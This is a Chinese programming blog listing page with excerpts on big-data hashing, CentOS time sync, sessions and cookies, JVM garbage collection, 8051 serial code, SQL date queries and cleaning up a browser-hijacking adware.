包括在非关联式数据库中，比如，在MongoDB内，文档(document)是最基本的数据组织形式，每个文档也是以Key-Value（键-值对）的方式组织起来。一个文档可以有多个Key-Value组合，每个Value可以是不同的类型，比如String、Integer、List等等。 { "name" : "July", "sex" : "male", "age" : 23 } set/map/multiset/multimap
set，同map一样，所有元素都会根据元素的键值自动被排序，因为set/map两者的所有各种操作，都只是转而调用RB-tree的操作行为，不过，值得注意的是，两者都不允许两个元素有相同的键值。
不同的是：set的元素不像map那样可以同时拥有实值(value)和键值(key)，set元素的键值就是实值，实值就是键值，而map的所有元素都是pair，同时拥有实值(value)和键值(key)，pair的第一个元素被视为键值，第二个元素被视为实值。
至于multiset/multimap，他们的特性及用法和set/map完全相同，唯一的差别就在于它们允许键值重复，即所有的插入操作基于RB-tree的insert_equal()而非insert_unique()。
hash_set/hash_map/hash_multiset/hash_multimap
hash_set/hash_map，两者的一切操作都是基于hashtable之上。不同的是，hash_set同set一样，同时拥有实值和键值，且实质就是键值，键值就是实值，而hash_map同map一样，每一个元素同时拥有一个实值(value)和一个键值(key)，所以其使用方式，和上面的map基本相同。但由于hash_set/hash_map都是基于hashtable之上，所以不具备自动排序功能。为什么?因为hashtable没有自动排序功能。
至于hash_multiset/hash_multimap的特性与上面的multiset/multimap完全相同，唯一的差别就是它们hash_multiset/hash_multimap的底层实现机制是hashtable（而multiset/multimap，上面说了，底层实现机制是RB-tree），所以它们的元素都不会被自动排序，不过也都允许键值重复。
所以，综上，说白了，什么样的结构决定其什么样的性质，因为set/map/multiset/multimap都是基于RB-tree之上，所以有自动排序功能，而hash_set/hash_map/hash_multiset/hash_multimap都是基于hashtable之上，所以不含有自动排序功能，至于加个前缀multi_无非就是允许键值重复而已。
此外，
关于什么hash，请看blog内此篇文章；关于红黑树，请参看blog内系列文章，关于hash_map的具体应用：请看这里，关于hash_set：请看此文。 OK，接下来，请看本文第二部分、处理海量数据问题之六把密匙。
第二部分、处理海量数据问题之六把密匙 密匙一、分而治之/Hash映射 + Hash_map统计 + 堆/快速/归并排序 1、海量日志数据，提取出某日访问百度次数最多的那个IP。
既然是海量数据处理，那么可想而知，给我们的数据那就一定是海量的。针对这个数据的海量，我们如何着手呢?对的，无非就是分而治之/hash映射 + hash统计 + 堆/快速/归并排序，说白了，就是先映射，而后统计，最后排序：
分而治之/hash映射：针对数据太大，内存受限，只能是：把大文件化成(取模映射)小文件，即16字方针：大而化小，各个击破，缩小规模，逐个解决hash_map统计：当大文件转化了小文件，那么我们便可以采用常规的hash_map(ip，value)来进行频率统计。堆/快速排序：统计完了之后，便进行排序(可采取堆排序)，得到次数最多的IP。 具体而论，则是： “首先是这一天，并且是访问百度的日志中的IP取出来，逐个写入到一个大文件中。注意到IP是32位的，最多有个2^32个IP。同样可以采用映射的方法，比如%1000，把整个大文件映射为1000个小文件，再找出每个小文中出现频率最大的IP（可以采用hash_map对那1000个文件中的所有IP进行频率统计，然后依次找出各个文件中频率最大的那个IP）及相应的频率。然后再在这1000个最大的IP中，找出那个频率最大的IP，即为所求。”--十道海量数据处理面试题与十个方法大总结。
关于本题，还有几个问题，如下：
1、Hash取模是一种等价映射，不会存在同一个元素分散到不同小文件中去的情况，即这里采用的是mod1000算法，那么相同的IP在hash后，只可能落在同一个文件中，不可能被分散的。
2、那到底什么是hash映射呢？简单来说，就是为了便于计算机在有限的内存中处理big数据，从而通过一种映射散列的方式让数据均匀分布在对应的内存位置(如大数据通过取余的方式映射成小树存放在内存中，或大文件映射成多个小文件)，而这个映射散列方式便是我们通常所说的hash函数，设计的好的hash函数能让数据均匀分布而减少冲突。尽管数据映射到了另外一些不同的位置，但数据还是原来的数据，只是代替和表示这些原始数据的形式发生了变化而已。
OK，有兴趣的，还可以再了解下一致性hash算法，见blog内此文第五部分：http://blog.csdn.net/v_july_v/article/details/6879101。
2、寻找热门查询，300万个查询字符串中统计最热门的10个查询
原题：搜索引擎会通过日志文件把用户每次检索使用的所有检索串都记录下来，每个查询串的长度为1-255字节。假设目前有一千万个记录（这些查询串的重复度比较高，虽然总数是1千万，但如果除去重复后，不超过3百万个。一个查询串的重复度越高，说明查询它的用户越多，也就是越热门），请你统计最热门的10个查询串，要求使用的内存不能超过1G。
解答：由上面第1题，我们知道，数据大则划为小的，如如一亿个Ip求Top 10，可先%1000将ip分到1000个小文件中去，并保证一种ip只出现在一个文件中，再对每个小文件中的ip进行hashmap计数统计并按数量排序，最后归并或者最小堆依次处理每个小文件的top10以得到最后的结。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f37294129a13b73c29309881dfa7d0c5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f7e7ed9cce4b577ff167a48547702190/" rel="bookmark">
			CentOS系统时间与现在时间相差8小时解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、vi /etc/sysconfig/clock #编辑文件
ZONE="Asia/Shanghai"
UTC=false #设置为false，硬件时钟不于utc时间一致
ARC=false
2、ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime #linux的时区设置为上海
3、ntpdate asia.pool.ntp.org或ntpdate 192.43.244.18 #对准时间，需要先安装ntp服务器 yum install ntp
4、/sbin/hwclock --systohc #设置硬件时间和系统时间一致并校准
转载于:https://www.cnblogs.com/wangyongbin/p/3666352.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6c41bfab25643a41af8c3e251d6bbdcb/" rel="bookmark">
			session与cookie
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		考虑一个问题：
如何抓取一个访问受限的网页？如校内好友的主页，个人新鲜事页面等。
显然，通过浏览器，我们可以手动输入用户名密码来访问目标页面，所谓“抓取”，只不过需要使用程序来模拟完成同样的工作，因此需要了解“登陆”过程中到底发生了什么。
对未登录用户，服务器强制用户跳转到登陆页面，用户键入用户名密码并提交，服务器将用户POST的信息与数据库中信息比对，如通过则跳转至landing page。那么在我们访问其他页面的时候，服务端如何判断我们的身份呢？由于HTTP协议是无状态的，显然，服务器不可能直接知道我们在上一秒刚刚登录成功。
最简单的思路，就是用户每个POST请求中，都需要带上用户名与密码来标识自己的身份；这样虽然可行，但大大加重了服务器的负担（对于每个request都需要到数据库验证），也大大降低了用户体验（每个页面都需要重新输入用户名密码，每个页面都带有登录表单）。
因此，诞生了一个解决方案：cookie。cookie，简而言之就是在本地计算机保存一些用户操作的历史信息（当然包括登录信息），并在用户再次访问该站点时浏览器通过HTTP协议将本地cookie内容发送给服务器，从而完成验证，或继续上一步操作。
进一步的，诞生了另外一种解决方案：session，简而言之就是在服务器上保存用户操作的历史信息。但该方式下，仍然需要将发送请求的客户端与session对象进行对应，所以可以借助cookie机制来获取客户端的标识（即session id），也可以通过GET方式将id提交给服务器。session id，即服务器上session对象文件的名称，由服务器负责产生，保证随机性与唯一性，相当于一个随机密钥，避免在握手或传输中暴露用户真实密码，类似的设计思想在SSO与OpenID中也经常用到。
再插入一个问题：为什么对于一些网站，关闭浏览器之后，session就失效了？
从上文可以知道，session一般通过cookie来保存session id，如果cookie设置为关闭浏览器就删除（expire），那么无论如何设置session的超时机制，由于浏览器重新启动时再也找不到原来的cookie了，因此服务器只能重新为其分配session id。
问题3：cookie和session的区别？
如上文所述，session和cookie的目的相同，都是为了克服http协议无状态的缺陷，但完成的方法不同。session通过cookie，在客户端保存session id，而将用户的其他会话消息保存在服务端的session对象中，与此相对的，cookie需要将所有信息都保存在客户端。因此cookie存在着一定的安全隐患，例如本地cookie中保存的用户名密码被破译，或cookie被其他网站收集（例如：1. appA主动设置域B cookie，让域B cookie获取；2. XSS，在appA上通过javascript获取document.cookie，并传递给自己的appB）。
在当初写php App时，知道通过SSO可以从Session中获取userid，但不知其所以然，于是遇到一个奇怪的问题：浏览器A标签脚本执行过程中，打开B标签访问同一个脚本，会被pending，直到A执行完毕。原因该脚本执行了session_start()，而php session_start()后对该session的写入是排他的，只有当脚本执行结束或显式执行session_destroy()才能释放session文件锁。因为不知道session的工作原理，被困扰了整整一个工作日！类似的问题还有因为不了解Lamp中字符编码的转换规则，导致某些在gbk和gb2312差集中的文字无法入库。
所以，知其然，还需要知其所以然。磨刀不误砍柴工，授人以渔，做web开发之前，有必要将一些必要知识了解清楚，才不会在用到时候捉襟见肘，或是在调bug时候如无头苍蝇乱转。做好自身建设，永远比case by case地被动满足来得高明。
本文转自:http://www.cnblogs.com/weimeng/archive/2012/01/18/2325942.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb6d57feb301b379fc0dfd0b7ffc83ec/" rel="bookmark">
			点餐系统(三)——数据库设计
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、 数据库设计
1.用户表
字段
字段类型
字段描述
备注
U_ID
Int
主键、自增
U_LoginID
Varchar（20）
(登陆账号)
电话号码
U_NickName
Varchar（20）
(昵称)
U_PassWord
Varchar（20）
(密码)
U_SignaTure
Varchar（150）
(个性签名)
U_Sex
Bit
(性别)
U_Birthday
Datetime
(生日)
U_Name
Varchar（30）
(真实姓名)
U_Email
Varchar（50）
(邮箱)
U_Intro
Varchar（300）
(简介)
U_HeadPortrait Varchar（100）
(头像)
U_Age
Int
年龄
U_NationID
Int
(国家ID)
外键
U_ProvinceID
Int
（省份ID）
外键
U_CityID
Int
（城市ID）
外键
U_Lon
double
用户经度
U_Lat
double
用户纬度
U_FriendshipPolicyID
Int
好友策略ID
外键
U_UserStateID
Int
(用户状态ID)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fb6d57feb301b379fc0dfd0b7ffc83ec/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b2f535008e12eec1fa97fd4e42b250d3/" rel="bookmark">
			Java内存回收收集器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		JVM通过GC来回收堆和方法区中的内存，GC的基本原理首先会找到程序中不再被使用的对象，然后回收这些对象所占用的内存，通常采用收集器的方式实现GC，主要的收集器有引用计数收集器和跟踪收集器
1.引用计数收集器
引用计数收集器采用的分散式的管理方式，通过计数器记录对象是否被引用。当计数器为零时，说明此对象不再被使用。于是可以进行回收。
引用计数收集器每次对象赋值时进行引用计数器增减，它有一定的消耗。另外引用计数收集器对于循环引用的场景没有办法实现回收。因此对于Java这种面向对象的语言会形成复杂引用关系，引用计数收集器不是非常适合，Sun JDK在实现GC时也未采用这种方式。
2.跟踪收集器
跟踪收集器采用的为集中式的管理方式，全局记录数据的引用状态。基于一定条件的触发（例如：定时，空间不足时），执行时需要从根集合扫描对象的引用关系，这可能会造成应用暂停，主要有：复制 （Copying），标记-清除（Mark Sweep），标记-压缩（Mark-Compact）三种实现算法。
复制（Copying）
复制采用的方式为从跟集合扫描出存活的对象，并将找到的存活对象复制到一块新的完全未使用的空间中。
复制收集器方式仅需从跟集合扫描所有存活的对象，当要回收的空间中存活对象较少时，复制算法会比较高效，其带来的成本是要增加一块空的内存空间及对象移动。
标记-清除（Mark Sweep）
标记清除采用的方式为从跟集合开始扫描，对存活的对象进行标记，标记完毕后，在扫描整个空间中未标记的对象，并进行回收。
标记清除动作不需要进行对象移动，且仅对不存活对象进行处理。在空间中存活对象较多的情况下较为高效，但由于标记清除采用的为直接回收不存活对象所占用内存，因此会造成内存碎片。
标记-压缩（Mark Compact）
标记-压缩采用和标记清除一样的方式对存活对象进行标记，但在清除时则不同，在回收不存活对象所占用内存空间后，会将其他所存活对象都往左端的空间进行移动，并更新引用其对象的指针。
标记压缩在标记清除的基础上还需进行对象移动，成本相对较高，好处则是不产生内存碎片。
--------------------------------------------------------------
跟搜索算法
在主流的商用语言中（JAVA,C# 甚至包括古老的LISP），都是使用跟搜索算法（GCRoots Tracing） 判定对象是否存活。这个算法的基本思路是通过一系列的名为GC Roots 的对象作为起点，从这些节点开始向下搜索，搜索所走过的路径称为引用链（Reference Chain），当一个对象到GC Roots 没有任何引用链相连（从GC Roots到这个对象不可达）时，则证明此对象是不可用的。
在Java语言中，可以作为GC Roots 的对象包括下面几种：
1.虚拟机栈（栈帧中得本地变量表）中引用的对象。
2.方法区中得类静态属性引用的对象。
3.方法区中得常量引用的对象
4.本地方法栈中JNI（Native方法）引用的对象
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e3a213f3b3b1138ba47a57e5dde86d1a/" rel="bookmark">
			C&#43;&#43;使用内存映射文件入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文介绍如何使用CreateFileMapping,MapViewOfFile创建内存映射文件，如何向内存映射文件中写入数据，读取数据。
#include &lt;iostream&gt; #include &lt;assert.h&gt; #include &lt;Windows.h&gt; #include &lt;WinBase.h&gt; #define BAD_POS 0xFFFFFFFF // returned by SetFilePointer and GetFileSize #define SUCCESS 0 using namespace std; typedef DWORD mmf_share_mode; typedef DWORD mmf_access_mode; typedef DWORD mmf_flags; int main(){ cout&lt;&lt; "create memorymapfile..." &lt;&lt;endl; const char * shared_name = "testMmf" ; const char * file_name = "d:\\testMmf.mmf" ; const DWORD mmf_size = 512*1024; //存取模式 mmf_access_mode access_mode = (GENERIC_READ|GENERIC_WRITE); //共享模式 mmf_share_mode share_mode = FILE_SHARE_READ | FILE_SHARE_WRITE; //文件属性 mmf_flags flags = FILE_FLAG_SEQUENTIAL_SCAN; //|FILE_FLAG_WRITE_THROUGH|FILE_FLAG_NO_BUFFERING; DWORD error_code; //创建文件 HANDLE mmHandle = CreateFile(file_name, access_mode, share_mode, NULL, OPEN_ALWAYS, flags, NULL); if (mmHandle == INVALID_HANDLE_VALUE) { error_code = GetLastError(); cout&lt;&lt; "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e3a213f3b3b1138ba47a57e5dde86d1a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7c3edaeb22f75c015ab832f7bd7a5752/" rel="bookmark">
			解决Axis2 服务器端与客户端 复合参数传递问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		网上看到说Axis2服务器端与客户端传递参数只支持数组和对象，但是想借助list传递多个参数，或参数不固定时，需转换成OMElement格式传递，我试了很多遍没成功。
所以自己想到办法，先将多个参数放到list中，到提交时，将list中的参数取出来放到数组中，能过数组进行传递，方便，快捷！
下面看代码
服务端：
public class UCallWsInterface {
// 测试连接
public String ConnectionCheck() {
String str = "连接成功";
return str;
}
// 业务功能
public CSPActionRes CSPAction(CSPActionReq actionReq) {
//加载xml文件中的内容
// XMLToBean ActionCmdbean = new XMLToBean();
// List&lt;ActionCmd&gt; actionList = ActionCmdbean.getActionCmd();
CSPActionRes actionRes = new CSPActionRes();
String ActionCmd = actionReq.getActionCmd();
List&lt;String&gt; OutParamList = new ArrayList&lt;String&gt;();
if("CheckSmartcard".equals(ActionCmd))
{
actionRes.setActionCmd("CheckSmartcard");
actionRes.setReturnCode("0");
actionRes.setReturnMsg("成功!");
String OutParam1 = "111";
String OutParam2 = "222";
String OutParam3 = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7c3edaeb22f75c015ab832f7bd7a5752/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/de69ecb25459b7c4a57edfd39a8d736a/" rel="bookmark">
			JAVA设计模式之享元模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		解释一下概念：也就是说在一个系统中如果有多个相同的对象，那么只共享一份就可以了，不必每个都去实例化一个对象。比如说一个文本系统，每个字母定一个对象，那么大小写字母一共就是52个，那么就要定义52个对象。如果有一个1M的文本，那么字母是何其的多，如果每个字母都定义一个对象那么内存早就爆了。那么如果要是每个字母都共享一个对象，那么就大大节约了资源。 在Flyweight模式中，由于要产生各种各样的对象，所以在Flyweight(享元)模式中常出现Factory模式。Flyweight的内部状态是用来共享的,Flyweight factory负责维护一个对象存储池（Flyweight Pool）来存放内部状态的对象。Flyweight模式是一个提高程序效率和性能的模式,会大大加快程序的运行速度.应用场合很多，下面举个例子： 先定义一个抽象的Flyweight类：
package Flyweight;public abstract class Flyweight{public abstract void operation();}实现一个具体类：
package Flyweight;public class ConcreteFlyweight extends Flyweight{private String string;public ConcreteFlyweight(String str){string = str;}public void operation(){System.out.println("Concrete---Flyweight : " + string);}} 实现一个工厂方法类：
package Flyweight;import java.util.Hashtable;public class FlyweightFactory{private Hashtable flyweights = new Hashtable();//----------------------------1public FlyweightFactory(){}public Flyweight getFlyWeight(Object obj){Flyweight flyweight = (Flyweight) flyweights.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/de69ecb25459b7c4a57edfd39a8d736a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dbab62cdb0accb0a2e6473fea795135b/" rel="bookmark">
			最优化之PH解法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		之前几篇blog分别讨论了无约束最优性条件，等式约束最优性条件，不等式约束最优性条件。根据最优性条件，我们可以用解析法求解。
还有序列求解的外罚函数法和内罚函数法。
小结一下：
无约束问题用微积分的知识，或者简单的下降法可以求解。
等式约束问题，构造拉格朗日乘子，再用解析法求解。
不等式约束问题复杂一点，构造KKT条件（包括拉格朗日乘子，以及相应的约束）求解。
一般情况下，拉格朗日乘子，或者KKT条件无法直接求解。经证明，拉格朗日乘子没有极小值，因此序列迭代求解也不行。
我们引进的外罚函数与内罚函数可以用下降算法解决上述问题，不过其有各自的病态缺陷。
有这么一种方法，把罚函数+拉格朗日乘子结合起来求解。这里讨论这种方法。
增广拉格朗日函数 先考虑等式约束情况下。 函数：
称为增广拉格朗日函数。
1. 单独的L函数，没有极小值，无法序列求解。
2. 单独的罚函数病态性质，很难得到最优解。
于是联合两个函数，称为增广拉格朗日函数。
通过增广矩阵转化为无约束问题：
根据最优性条件可得：
其中x*是x的稳定点。不过上式中的lambda*未知，yita未知，x未知。三个未知数，如何求解？
先解决yita 在单纯的外罚函数，或者内罚函数方法中，我们把yita设定为很大的值，用序列下降法可以逼近得到近似最优解。不过由于yita很大，容易造成病态的函数性质。那么在这种情况下会这样吗？
经证明，在满足一定的条件下，存在一个yita*，对于所有的yita&gt;yita*得到的x，x等于原最优化的最优解x*。于是我们只要取yita大于一定大小。这也就解决了罚函数的病态问题。
然后是lambda* X*是在Lambda*的情况下的最优解，于是在lambda*未知时，无法求得x*;同样，x*未知的情况下，也无法求lambda*。一个简单的方法就是两个变量交叉序列求解。
X，lambda的更新 在固定lambda之后，就可以直接用解析法直接解x。假设根据lambda(k)解得的X为x(k),那么有：
又因为，不加yita的拉格朗日乘子，根据KKT条件，如果lambda*和x*是最优解，有：
由此，观察对比两个式子，我们可以如下更新lambda：
这样更新使得其后一项逼近最优解的形式。
迭代结束条件 有上可以看出，当lambda收敛，x*满足KT条件时，有：
即为更新的结束条件。
加速迭代 实践中发现，迭代的过程往往过慢，我们可以增大yita的放大系数后再迭代。其中收敛速度可用||c(xk)||/||c(xk-1)||来度量。
具体解法步骤 等式约束乘子法解法——PH算法
如上为等式约束的PH算法。
不等式的情况下，先用辅助变量修改为等式情况，再如上求解即可。
Matlab求解 下面用PH算法求解一个简单的问题：
代码：
clear; clc; x(1)=0; x(2)=0; lambda=1; yita=100; c=2; sita=0.5; k=1; e=0.01; E=1; while(E&gt;0.01) temp_E=(x(1)+x(2)-2); x(1)=2*yita+lambda/(2*yita+2); x(2)=2*yita+lambda/(2*yita+2); E=(x(1)+x(2)-2); if(E&lt;0.01) break; end if(E/temp_E&gt;sita) yita=c*yita; end lambda=lambda-yita*(x(1)+x(2)-2); end 得到结果：
X1=1.0002;
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dbab62cdb0accb0a2e6473fea795135b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/000b46b2f77499a4431149afc68d0b83/" rel="bookmark">
			java判断基本数据类型的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 经检验，网上很多用instanceof直接判断的方法是行不通的。我总结出两种方法。 以判断变量是否为int为例，直接上代码。 方法一： public class test { public static void main(String[] args){ test t=new test(); int int_num=0; double double_num=0; System.out.println(t.judgeType(int_num)); System.out.println(t.judgeType(double_num)); } public boolean judgeType(Object temp){ if(temp instanceof Integer) return true; else return false; } }
方法二： public class test { public static void main(String[] args){ try{ Scanner input=new Scanner(System.in); int i=input.nextInt(); System.out.println("输入正确"); } catch(Exception e){ System.out.println("输入错误"); }	} }
方法一使用的是instanceof运算符，利用基本数据类型与其包装类自动转换的特点，运用多态，达到判断基本数据类型的目的。 方法二是运用异常处理的知识。较为巧妙。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4fecaf129505cded91947f194e832008/" rel="bookmark">
			Drawcli分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当前环境：windows7 32位旗舰版、VS2010旗舰版
Drawcli介绍：
Drawcli是VS2010中的一个示例程序，能够进行简单的绘图操作，例如线、矩形、圆角矩形、多边形等，位于VS安装目录"Microsoft Visual Studio 10.0\Samples\2052\VC2010Samples\C++\MFC\ole\drawcli"下。
1、对象的绘画。
void CDrawView::OnDraw(CDC* pDC) { pDoc-&gt;Draw(pDrawDC, this);//CDrawDoc::Draw() } void CDrawDoc::Draw(CDC* pDC, CDrawView* pView) { POSITION pos = m_objects.GetHeadPosition(); while (pos != NULL) { CDrawObj* pObj = m_objects.GetNext(pos); pObj-&gt;Draw(pDC);//绘画图形 if (pView-&gt;m_bActive &amp;&amp; !pDC-&gt;IsPrinting() &amp;&amp; pView-&gt;IsSelected(pObj)//判断对象是否在视图的选中列表中，视图使用CDrawObjList m_selection来存储选中图形的指针。 ) { pObj-&gt;DrawTracker(pDC, CDrawObj::selected);//绘画选中图形时的靶点 } } } 2、对象的存储。
通过对象的绘画我们可以知道，对象存储在文档类CDrawDoc的中，即CDrawObjList m_objects中，视图中存储了选中对象的指针在列表中，即CDrawObjList m_selection中。
3、对象的操作。
添加线、添加矩形、添加圆角矩形、添加椭圆等操作由CRectTool类进行处理；添加多边形由CPolyTool类进行处理；操作以存在的对象由CSelectTool类进行处理。 static CSelectTool selectTool; static CRectTool lineTool(line); static CRectTool rectTool(rect); static CRectTool roundRectTool(roundRect); static CRectTool ellipseTool(ellipse); static CPolyTool polyTool; 这里使用Tool类来完成一个特定功能，例如添加线条、添加矩形、添加多边形等等，有点类似于命令模式，这样做的好处是符合封装的特性，降低耦合度，修改一个功能不影响其他的功能。一般绘图软件都需要这样的类，用tool来处理特定功能的鼠标操作，而在不涉及鼠标操作，可以使用命令模式。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4fecaf129505cded91947f194e832008/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/86b6653968db4a4f5715621dd6949103/" rel="bookmark">
			51单片机串口程序，字符串/16进制发送与接收
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这篇文章将说明51串口通信的发送与接收。分为：单个字符接收，字符串接收；十进制发送与接收，十六进制发送与接收。
字符串发送与十六进制发送，参考：http://blog.csdn.net/yibu_refresh/article/details/22695063
程序皆由PC串口工具发送，由单片机接收，并返回接收值给PC机。
一：单个字符的发送与接收
#include &lt;reg52.h&gt; #define uint unsigned int #define uchar unsigned char //定义接收 字符 uchar Buffer; //串口初始化函数 void URATinit( ) { TMOD=0x20; SCON=0x50; EA=1; ES=1; TR1=1; TH1=0xfd; TL1=0xfd; } //中断函数 void receive() interrupt 4 { if(RI) { Buffer=SBUF; RI=0; } SBUF=Buffer; while(!TI); TI=0; } //主函数 void main() { URATinit( ); }在中断函数中，如果接收到数据则RI由硬件置1，这时候把SBUF缓冲区的数据赋值给Buffer，并将RI置0,等待下次接收。同时，将接收到的数据再放入缓冲区，发送给PC机。当发送完毕的时候TI会被硬件置1，这时候需要将TI置0，以待下次发送。 运行效果：
发送数据1，则返回1。
二.字符串接收
（1）
#include &lt;reg52.h&gt; #define uint unsigned int #define uchar unsigned char //定义接收 数组 uchar Buffer[5]={0}; uchar i=0,j=0; //串口初始化函数 void URATinit( ) { TMOD=0x20; SCON=0x50; EA=1; ES=1; TR1=1; TH1=0xfd; TL1=0xfd; } //中断函数 void receive() interrupt 4 { if(RI) { Buffer[i]=SBUF; RI=0; } SBUF=Buffer[i]; while(!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/86b6653968db4a4f5715621dd6949103/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac2012a82da4d04e108c7b99427eb978/" rel="bookmark">
			串口发送数据——字符串发送与十六进制发送的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在使用串口发送数据时可以选择字符串发送或者十六进制发送，通常情况下我们习惯选用字符串发送数据。关于两者的区别，需要从计算机存储数据的格式说起。
在计算机中，数据是以二进制的形式存储的，例如十进制 1（10）在计算机中用 0000 0001（2）来表示。我们在用串口发送数据的时候首先将待数据转换为对应的ASCII码，然后再将这些ASCII码按照二进制的方式一位一位的发送出去。
例如我们要发送一串数据“A852010100000000A91A”，以字符串和十六进制两种方式发送：
（1）字符串发送
串口以字符串发送数据，首先将字符串转化为二进制，格式如下：
0000 1010 0000 1000 0000 0110 0000 0010 0000 0000 0000 0001 0000 0000 0000 0001 A 8 5 2 0 1 0 1
0000 0000 0000 0000 0000 0000 0000 0000 0000 1010 0000 1001 0000 0001 0000 1010
0 0 0 0 A 9 1 A
然后按照8位（串口设置数据位为8位）形式将数据发送出去。
串口接收的数据格式如下：
编号
数据内容
编号
数据内容
0
A
8
0
1
8
9
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ac2012a82da4d04e108c7b99427eb978/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/78ef6f0b5e4e419bb28aa4dac4746100/" rel="bookmark">
			用SQL查询昨天、今天、明天和本周的记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		From: http://mage.blogcn.com/ 怎么用SQL查询昨天、今天、明天和本周的记录？又怎么用SQL查询一天，三天，一周，一个月，更长一些——一个季度的记录呢？本文中给出了一些方法。 SQL查询今天的记录：
datediff(day,[Datetime],getdate())=0 把Datetime换为你的相应字段； SQL查询昨天的记录：
datediff(day,[Datetime],getdate())=1 把Datetime换为你的相应字段，getdate()-Datetime即为时间差。 本月记录：
SELECT * FROM 表 WHERE datediff(month,[dateadd],getdate())=0 本周记录：
SELECT * FROM 表 WHERE datediff(week,[dateadd],getdate())=0 本日记录：
SELECT * FROM 表 WHERE datediff(day,[dateadd],getdate())=0一天
select * from T_news where datediff(day,addtime,getdate())=0三天
select * from T_news where datediff(day,addtime,getdate())&lt;= 2 and datediff(day,addtime,getdate())&gt;= 0一周
select * from T_news WHERE (DATEPART(wk, addtime) = DATEPART(wk, GETDATE())) AND (DATEPART(yy, addtime) = DATEPART(yy, GETDATE()))注意：此时不能用 datediff 差值为7,因为，datediff只表示间隔数
一月
select * from T_news WHERE (DATEPART(yy, addtime) = DATEPART(yy, GETDATE())) AND (DATEPART(mm, addtime) = DATEPART(mm, GETDATE()))一季度
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/78ef6f0b5e4e419bb28aa4dac4746100/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/723bb80041fcba2ca4c258bbcd39a96e/" rel="bookmark">
			再遇流氓网站3448.com
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 今天打开网页，怎么觉的首页换成3448.com的网站了。改掉后还会自动加上去，奇怪了，卡巴斯基也没有检测到？AVG也没有？ 解决： 找到注册表的启动项run，current_user and local_mathine中有些奇怪的项目(rundll32.exe d4zsl.dll,rundll32.exe nmprt.sys)，杀掉。再找到上述的几个文件c:\winnt\system32，强力删除!!!修改c:\winnt\system32\drivers\etc\hosts文件，再里面的垃圾全部删除，再增加如下： 127.0.0.1 localhost 搜索最近3天修改后的*.dll文件，把可疑的删除(用processxp.exe查找进程，看是不是被很多程序启用，如果是，算它一下了，删除。)，再更换首页，嘿嘿!不见有了。终于删除了。 &lt;script type=text/javascript charset=utf-8 src="http://static.bshare.cn/b/buttonLite.js#style=-1&amp;uuid=&amp;pophcol=3&amp;lang=zh"&gt;&lt;/script&gt; &lt;script type=text/javascript charset=utf-8 src="http://static.bshare.cn/b/bshareC0.js"&gt;&lt;/script&gt; 阅读(996) | 评论(0) | 转发(0) | 0 上一篇：明天要去考试了
下一篇：自动备份Mail Server脚本
